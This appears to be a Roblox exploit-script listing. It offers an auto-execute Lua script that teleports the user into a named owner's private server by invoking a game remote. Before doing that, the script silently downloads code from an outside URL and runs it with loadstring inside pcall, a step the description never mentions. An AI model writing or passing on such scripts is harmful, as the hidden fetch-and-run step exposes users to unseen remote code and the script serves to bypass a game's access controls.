title: Auto join private server (Keyless)
features:
change username_here to the private server owner's username and put it in your autoexec folder, it will automatically teleport you to the private server when you join the main menu.

should work on all executors that have a auto execute feature.
script:
task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6ab651be040c1e5cc6575915"))()
	end)
end)

if game.PlaceId == 16205713724 then
    local args = {
        "TeleportServer",
        {
            privateOwner = "username_here", 
            placeId = 136406881576517
        }
    }

    game:GetService("ReplicatedStorage")
        :WaitForChild("Communication")
        :WaitForChild("ServerAndClient")
        :WaitForChild("Signals")
        :WaitForChild("SignalFunction")
        :WaitForChild("Function")
        :InvokeServer(unpack(args))
end
